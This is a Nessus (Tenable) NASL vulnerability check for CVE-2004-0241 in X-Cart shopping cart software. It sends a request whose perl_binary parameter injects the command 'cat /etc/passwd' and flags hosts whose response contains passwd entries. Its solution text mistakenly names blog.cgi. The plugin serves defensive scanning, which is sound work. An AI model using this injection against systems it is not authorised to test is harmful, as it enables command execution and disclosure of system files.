#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(12040);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-2004-0241");
 script_bugtraq_id(9560);
 script_xref(name:"OSVDB", value:"3808");
 script_xref(name:"OSVDB", value:"3809");
 
 script_name(english:"Qualiteam X-Cart Multiple Script perl_binary Parameter Arbitrary Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary commands can be run on the remote server." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Qualiteam X-Cart - a shopping cart software 
written in PHP.

There is a bug in this software which may allow an attacker to execute
arbitrary commands on the remote web server with the privileges of the
web user.  In addition to this, there are some flaws which may allow
an attacker to obtain more information about the remote server, like
the physical location of the remote web root." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version of blog.cgi or disable this software." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );

script_end_attributes();

 
 script_summary(english:"Checks Qualiteam X-Cart");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("webmirror.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port))exit(0);

foreach dir (cgi_dirs())
{
 u = string(dir,"/admin/general.php?mode=perlinfo&config[General][perl_binary]=cat%20/etc/passwd||");
 r = http_send_recv3(method: "GET", item: u, port:port);
 if (isnull(r)) exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string: r[0]+r[1]+r[2]))
 {
   if (report_verbosity < 1)
     security_hole(port);
   else
     security_hole(port, extra:
strcat('\nThe following URL exhibits the flaw :\n\n', build_url(port: port, qs: u), '\n'));
   exit(0);
 }
}
